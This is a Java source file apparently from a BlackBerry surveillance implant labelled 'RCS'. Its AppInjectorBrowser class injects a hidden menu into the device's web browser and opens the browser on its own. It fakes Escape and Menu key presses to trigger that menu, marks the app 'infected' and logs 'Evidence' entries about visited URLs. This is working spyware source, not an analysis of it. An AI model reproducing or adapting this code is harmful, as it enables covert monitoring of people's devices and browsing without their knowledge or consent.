//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.agent.url;

import net.rim.blackberry.api.browser.Browser;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.Device;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.injection.AppInjectorInterface;
import blackberry.injection.KeyInjector;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjBrowser", DebugLevel.VERBOSE);
    //#endif

    BrowserMenuItem menu = BrowserMenuItem.getInstance();

    private static AppInjectorBrowser instance;
    private static final long GUID = 0xa2b7338e410f087bL;
    private static final int DELAY = 15000;
    private static final int MAX_TRIES = 4;

    private int tries = 0;
    private int delay = 200; //500;
    boolean infected;

    public static synchronized AppInjectorBrowser getInstance() {
        if (instance == null) {
            instance = (AppInjectorBrowser) RuntimeStore.getRuntimeStore().get(
                    GUID);
            if (instance == null) {
                final AppInjectorBrowser singleton = new AppInjectorBrowser();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    private AppInjectorBrowser() {

    }

    public boolean injectMenu() {
        menu.addMenuBrowser();
        return true;
    }

    public boolean deleteMenu() {
        menu.removeMenuBrowser();
        return true;
    }

    public boolean callMenuByKey() {

        Screen screen = UiApplication.getUiApplication().getActiveScreen();

        //#ifdef DEBUG
        debug.info("calling browser menu: " + screen);
        if (screen != null) {
            debug.trace("application: " + screen.getApplication());
            debug.trace("menu: " + screen.getMenu(0));
        }
        //#endif

        tries++;
        if (tries >= MAX_TRIES) {
            //#ifdef DEBUG
            debug.error("callMenuByKey: too many tries");
            //#endif
            if (tries == MAX_TRIES) {
                Evidence.info("NO URL");
            }
            return false;
        }

        //TODO: togliere
        //Backlight.enable(true);
                
        if (tries % 2 == 0) {
            //#ifdef DEBUG
            debug.trace("callMenuByKey press escape key, try: " + tries);
            //#endif
            KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
            //KeyInjector.trackBallRawClick();
        }
        
        Browser.getDefaultSession().showBrowser(); 
        
        if(Device.getInstance().atLeast(6, 0)){  
            //#ifdef DEBUG
            debug.trace("callMenuByKey, OS > 6, display blank");
            //#endif
            Browser.getDefaultSession().displayPage("about:blank");
            Utils.sleep(1000);
        }

        //#ifdef DEBUG
        debug.trace("callMenuByKey press menu key, try: " + tries);
        //#endif
        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        Utils.sleep(delay + tries * 20);

        //#ifdef DEBUG
        debug.trace("callMenuByKey: pressRawKey");
        //#endif
        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));

        Utils.sleep(delay + tries * 20);
        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        
        menu.firstTime();

        if (screen != null) {
            screen.close();
        }
        return true;
    }

    public String getAppName() {
        return "Browser";
    }

    public void callMenuInContext() {
        menu.callMenuInContext();

    }

    public boolean isInfected() {
        return infected;
    }

    public void setInfected(boolean value) {
        if (value) {
            Evidence.info("URL: " + tries);
        }
        infected = true;
    }

    public int getDelay() {

        return DELAY;
    }

    public void reset() {
        tries = 0;
    }

}
